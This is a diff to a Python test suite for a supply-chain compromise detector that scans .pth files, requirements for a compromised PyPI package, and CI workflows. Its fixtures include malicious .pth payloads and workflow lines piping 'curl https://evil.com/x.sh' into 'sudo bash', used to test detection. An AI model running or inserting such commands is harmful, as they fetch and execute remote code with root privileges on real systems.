@@ -18,6 +18,7 @@ Sources of the bypass classes:
 """
 from __future__ import annotations
 
+import shutil
 import sys
 import tempfile
 import unittest
@@ -30,15 +31,28 @@ sys.path.insert(0, str(_REPO_ROOT / "scripts"))
 import detect_compromise as dc  # noqa: E402
 
 
+class _TempDirTestBase(unittest.TestCase):
+    """Base class that auto-cleans tempfile.mkdtemp() between tests.
+    Gemini medium on d53c64f noted the previous suite leaked temp
+    dirs on every run. ``_mkdtemp()`` returns a Path and registers
+    its cleanup via self.addCleanup; ignore_errors=True so a still-
+    locked file on Windows doesn't fail the test."""
+
+    def _mkdtemp(self) -> Path:
+        p = Path(tempfile.mkdtemp())
+        self.addCleanup(shutil.rmtree, p, ignore_errors=True)
+        return p
+
+
 # ── PTH file scanning ──────────────────────────────────────────────────
 
 
-class PthMultilineRegexTests(unittest.TestCase):
+class PthMultilineRegexTests(_TempDirTestBase):
     """Lock in the MULTILINE fix from subagent CRITICAL on 4cc0bb4."""
 
     def _make_venv(self, pth_content: bytes) -> Path:
         """Build an ephemeral venv directory tree with a single .pth file."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         sp = tmp / "venv" / "Lib" / "site-packages"
         sp.mkdir(parents=True)
         (sp / "attack.pth").write_bytes(pth_content)
@@ -77,7 +91,7 @@ class PthMultilineRegexTests(unittest.TestCase):
         """Subagent HIGH on 4cc0bb4: rglob('site-packages/*.pth') only
         matched DIRECT children of site-packages. A payload in a
         sub-package dir was invisible."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         deep = tmp / "venv" / "Lib" / "site-packages" / "malicious_pkg"
         deep.mkdir(parents=True)
         (deep / "attack.pth").write_bytes(b"import os\nos.system('evil')\n")
@@ -91,13 +105,13 @@ class PthMultilineRegexTests(unittest.TestCase):
         self.assertTrue(result.ok, "path-only .pth must not false-positive")
 
 
-class PthAllowlistTamperTests(unittest.TestCase):
+class PthAllowlistTamperTests(_TempDirTestBase):
     """Lock in the allowlist exact-match fix from subagent CRITICAL on
     4cc0bb4. The original prefix-only check let a tampered file with
     the known-good magic-bytes prefix + appended payload sail through."""
 
     def test_legit_distutils_precedence_pth_allowlisted(self):
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         f = tmp / "distutils-precedence.pth"
         f.write_bytes(
             b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
@@ -109,7 +123,7 @@ class PthAllowlistTamperTests(unittest.TestCase):
     def test_tampered_pth_rejected_from_allowlist(self):
         """The bypass: legit prefix + appended exec payload, fits within
         300-byte size limit. Previously slipped through; now rejected."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         f = tmp / "distutils-precedence.pth"
         f.write_bytes(
             b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
@@ -124,7 +138,7 @@ class PthAllowlistTamperTests(unittest.TestCase):
         """The allowlist must tolerate harmless whitespace differences
         (a trailing newline from a text editor) — only meaningful
         content changes should fail it."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         f = tmp / "distutils-precedence.pth"
         f.write_bytes(
             b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
@@ -137,13 +151,13 @@ class PthAllowlistTamperTests(unittest.TestCase):
 # ── Compromised-PyPI regex ─────────────────────────────────────────────
 
 
-class CompromisedPyPIRegexTests(unittest.TestCase):
+class CompromisedPyPIRegexTests(_TempDirTestBase):
     """Lock in the PEP 508 form coverage. Across rounds the bots
     found bypasses for: bare name, extras, version specifiers, environment
     markers, direct references, trailing comments."""
 
     def _scan(self, requirements_content: str) -> dc.CheckResult:
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         (tmp / "requirements.txt").write_text(requirements_content)
         return dc.check_compromised_pypi_in_deps(tmp)
 
@@ -193,8 +207,15 @@ class CompromisedPyPIRegexTests(unittest.TestCase):
             "'litellm-replacement' must not match the 'litellm' pattern",
         )
 
+    def test_whitespace_before_extras_caught(self):
+        """Gemini medium on d53c64f: PEP 508 allows whitespace between
+        the package name and the extras bracket. ``litellm [proxy]``
+        is legal and must match."""
+        self.assertFalse(self._scan("litellm [proxy]==1.30.0").ok)
+        self.assertFalse(self._scan("litellm   [proxy,extra]==1.30.0").ok)
 
-class CompromisedPyPIExcludePathsTests(unittest.TestCase):
+
+class CompromisedPyPIExcludePathsTests(_TempDirTestBase):
     """Lock in the path-parts (not substring) exclusion from Gemini HIGH
     on 9a20e14."""
 
@@ -202,7 +223,7 @@ class CompromisedPyPIExcludePathsTests(unittest.TestCase):
         """A user project dir named ``my-venv-project/`` would be
         wrongly excluded by the prior substring matcher. It must be
         scanned now."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         legit_dir = tmp / "my-venv-project"
         legit_dir.mkdir()
         (legit_dir / "requirements.txt").write_text("litellm==1.0.0")
@@ -217,7 +238,7 @@ class CompromisedPyPIExcludePathsTests(unittest.TestCase):
     def test_requirements_dist_txt_scanned(self):
         """A file named ``requirements-dist.txt`` would be wrongly
         excluded by the prior substring matcher (matched "dist/")."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         (tmp / "requirements-dist.txt").write_text("litellm==1.0.0")
         result = dc.check_compromised_pypi_in_deps(tmp)
         self.assertFalse(result.ok, "requirements-dist.txt must be scanned")
@@ -226,7 +247,7 @@ class CompromisedPyPIExcludePathsTests(unittest.TestCase):
         """A real venv site-packages requirements.txt must NOT be
         scanned (would always false-positive on a venv with the
         compromised package legitimately installed-pre-discovery)."""
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         venv_sp = tmp / "venv" / "Lib" / "site-packages"
         venv_sp.mkdir(parents=True)
         (venv_sp / "requirements.txt").write_text("litellm==1.0.0")
@@ -241,12 +262,12 @@ class CompromisedPyPIExcludePathsTests(unittest.TestCase):
 # ── Workflow .yml + .yaml + pattern coverage ───────────────────────────
 
 
-class WorkflowScanCoverageTests(unittest.TestCase):
+class WorkflowScanCoverageTests(_TempDirTestBase):
     """Lock in the .yaml extension fix (CodeRabbit on 3fe4154) and the
     broadened pattern set (Gemini security-medium on 9a20e14)."""
 
     def _make_repo(self, workflows: dict[str, str]) -> Path:
-        tmp = Path(tempfile.mkdtemp())
+        tmp = self._mkdtemp()
         wf_dir = tmp / ".github" / "workflows"
         wf_dir.mkdir(parents=True)
         for name, body in workflows.items():
@@ -371,6 +392,25 @@ class WorkflowScanCoverageTests(unittest.TestCase):
         })
         result = dc.check_workflows_for_suspicious_commits(repo)
         self.assertTrue(result.ok)
+
+    def test_sudo_with_flags_caught(self):
+        """Gemini medium on d53c64f: ``sudo -E bash`` /
+        ``sudo -u root bash`` are common malicious payload forms.
+        The sudo group now accepts trailing flag chains."""
+        repo1 = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | sudo -E bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo1).ok,
+            "sudo -E bash must be caught",
+        )
+        repo2 = self._make_repo({
+            "x.yml": "run: curl https://evil.com/x.sh | sudo -E -H -u root /bin/bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo2).ok,
+            "sudo with multiple flags + abs-path must be caught",
+        )
 
 
 if __name__ == "__main__":
